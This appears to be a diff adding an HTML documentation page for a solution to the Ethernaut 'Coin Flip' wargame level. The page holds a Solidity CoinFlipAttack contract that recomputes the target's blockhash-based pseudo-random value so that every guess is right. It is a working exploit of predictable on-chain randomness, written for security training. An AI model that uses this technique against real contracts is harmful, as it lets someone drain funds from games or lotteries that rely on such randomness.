@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 3: Coin Flip</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 3: Coin Flip</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./03_CoinFlip.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">CoinFlipAttack</span> </span>{
+    <span class="hljs-keyword">using</span> <span class="hljs-title">SafeMath</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">uint256</span></span>;
+
+    CoinFlip coinflip;
+    <span class="hljs-keyword">uint256</span> FACTOR = <span class="hljs-number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">GuessIsRight</span>(<span class="hljs-params"></span>)</span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> instanceAddress</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        coinflip = CoinFlip(instanceAddress);
+    }</pre></div>
+      
+        
+        <p>To be able to always ‘guess’ right, we replicate what the <code>CoinFlip</code> instance
+is doing to obtain the same pseudo-random value. Since our test expects an event
+to confirm the guess was correct, <code>GuessIsRight</code> is emitted.</p>
+
+        <div class='highlight'><pre>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doFlip</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-keyword">uint256</span> blockValue = <span class="hljs-keyword">uint256</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span>.sub(1)));
+
+        <span class="hljs-keyword">uint256</span> coinFlip = blockValue.div(FACTOR);
+        <span class="hljs-keyword">bool</span> side = coinFlip == <span class="hljs-number">1</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;
+
+        <span class="hljs-keyword">bool</span> isGuessRight = coinflip.flip(side);
+        <span class="hljs-keyword">if</span> (isGuessRight) {
+            <span class="hljs-keyword">emit</span> GuessIsRight();
+        }
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
